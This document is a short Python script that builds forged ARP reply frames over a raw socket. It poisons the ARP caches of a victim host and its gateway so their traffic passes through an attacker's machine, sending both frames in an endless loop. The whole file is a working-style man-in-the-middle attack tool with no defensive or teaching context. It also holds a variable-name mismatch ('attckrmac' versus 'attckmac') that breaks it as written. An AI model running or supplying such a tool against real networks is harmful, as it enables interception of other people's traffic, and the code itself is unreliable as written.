import socket
import struct
import binascii
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket. htons(0x0800))
s.bind(("eth0",socket.htons(0x0800)))
attckrmac = '\x00\x0c\x29\x4f\x8e\x76'
victimmac ='\x00\x0C\x29\x2E\x84\x5A'
gatewaymac = '\x00\x50\x56\xC0\x00\x28'
code ='\x08\x06'
ethernet1 = victimmac + attckmac + code
ethernet2 = gatewaymac +  attckmac + code
htype = '\x00\x01'
protype = '\x08\x00'
hsize = '\x06'
psize = '\x04'
opcode = '\x00\x02'
gateway_ip = '192.168.43.85'
victim_ip = '192.168.43.131'
gatewayip = socket.inet_aton ( gateway_ip )
victimip = socket.inet_aton ( victim_ip )
victim_ARP = ethernet1 + htype + protype + hsize + psize + opcode + attckmac + gatewayip + victimmac + victimip
gateway_ARP = ethernet2 + htype + protype + hsize + psize +opcode + attckmac + victimip + gatewaymac + gatewayip

while 1:
   s.send(victim_ARP)
   s.send(gateway_ARP)
